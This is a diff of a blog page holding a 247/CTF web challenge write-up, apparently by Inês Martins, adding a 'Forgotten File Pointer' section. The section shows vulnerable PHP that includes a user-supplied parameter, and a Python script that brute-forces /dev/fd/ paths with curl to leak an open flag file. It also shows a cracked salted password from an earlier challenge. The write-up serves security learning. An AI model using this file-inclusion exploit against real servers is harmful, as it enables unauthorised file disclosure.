@@ -9,7 +9,7 @@
     <meta name="HandheldFriendly" content="True" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
-    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=c74203a698" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=bff87f81a6" />
 
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
     <link rel="canonical" href="https://inesmartins.github.io//247-ctf-web-write-up/" />
@@ -23,7 +23,7 @@
     <meta property="og:url" content="https://inesmartins.github.io//247-ctf-web-write-up/" />
     <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/06/ctf.png" />
     <meta property="article:published_time" content="2020-06-28T10:47:34.000Z" />
-    <meta property="article:modified_time" content="2020-06-30T20:33:42.000Z" />
+    <meta property="article:modified_time" content="2020-08-18T17:06:45.000Z" />
     <meta property="article:tag" content="247ctf" />
     <meta property="article:tag" content="ctf" />
     <meta property="article:tag" content="jwt" />
@@ -76,7 +76,7 @@
     "headline": "247/CTF Write-up | Web Challenges",
     "url": "https://inesmartins.github.io//247-ctf-web-write-up/",
     "datePublished": "2020-06-28T10:47:34.000Z",
-    "dateModified": "2020-06-30T20:33:42.000Z",
+    "dateModified": "2020-08-18T17:06:45.000Z",
     "image": {
         "@type": "ImageObject",
         "url": "https://inesmartins.github.io//content/images/2020/06/ctf.png",
@@ -172,7 +172,7 @@
                             <h4 class="author-name"><a href="/author/ines/">Inês Martins</a></h4>
                             <div class="byline-meta-content">
                                 <time class="byline-meta-date" datetime="2020-06-28">28 Jun 2020</time>
-                                <span class="byline-reading-time"><span class="bull">&bull;</span> 3 min read</span>
+                                <span class="byline-reading-time"><span class="bull">&bull;</span> 4 min read</span>
                             </div>
                         </section>
 
@@ -258,7 +258,18 @@ for ($i = 0; $i &lt; 1000000000; $i++) {
     }
 }
 
-?&gt;</code></pre><p>And we find a match! <code>f789bbc328a3d1a3237701818</code>. </p><p>If we remove the salt - <code>f789bbc328a3d1a3</code> we get a password that works: <code>237701818</code>. </p><p>Let's try it out!</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/final.png" class="kg-image"></figure>
+?&gt;</code></pre><p>And we find a match! <code>f789bbc328a3d1a3237701818</code>. </p><p>If we remove the salt - <code>f789bbc328a3d1a3</code> we get a password that works: <code>237701818</code>. </p><p>Let's try it out!</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/final.png" class="kg-image"></figure><h2 id="4-forgotten-file-pointer">4. Forgotten File Pointer</h2><blockquote>We have opened the flag, but forgot to read and print it. Can you access it anyway?</blockquote><pre><code class="language-php">&lt;?php
+  $fp = fopen("/tmp/flag.txt", "r");
+  if($_SERVER['REQUEST_METHOD'] === 'GET' &amp;&amp; isset($_GET['include']) &amp;&amp; strlen($_GET['include']) &lt;= 10) {
+    include($_GET['include']);
+  }
+  fclose($fp);
+  echo highlight_file(__FILE__, true);
+?&gt;</code></pre><p>So, clearly, we need to add an <code>include</code> parameter to the page <code>GET</code> request that has a value under 10 chars, and that somehow lets us print the content of the <code>fp</code> stream, for example something like:</p><pre><code class="language-php">echo fread($fp)</code></pre><p>After toying with the idea of hosting this code on a remote host with a <em>very</em> short URL (and failing miserably), I ended up having to check <a href="https://hackmd.io/@Chivato/rkj-Y1GVI">this write-up</a> in order to get to the solution. </p><p>The solution is actually pretty simple: on Linux systems, every time you create a stream in order to read a file using <code>fopen</code> you're also creating a <a href="https://en.wikipedia.org/wiki/File_descriptor">file descriptor</a> which is basically a file hosted at <code>/dev/fd/</code> that can be passed to the <code>include</code> function.</p><p>File descriptors are identified by a sequential number and we don't know which number matches this file, however, we can simply brute-force the answer:</p><pre><code class="language-python">import os
+
+for i in range(0, 100):
+    print("Testing file descriptor " + str(i))
+    os.system("curl -s https://[custom_247ctf_subdomain].247ctf.com/?include=/dev/fd/" + str(i) + " &gt;&gt; output.txt")</code></pre><p>After looking at the output file, we get our flag!</p>
                 </div>
             </section>
 
@@ -404,7 +415,7 @@ for ($i = 0; $i &lt; 1000000000; $i++) {
         integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
         crossorigin="anonymous">
     </script>
-    <script src="/assets/built/casper.js?v=c74203a698"></script>
+    <script src="/assets/built/casper.js?v=bff87f81a6"></script>
 
     <script>
         // Parse the URL parameter
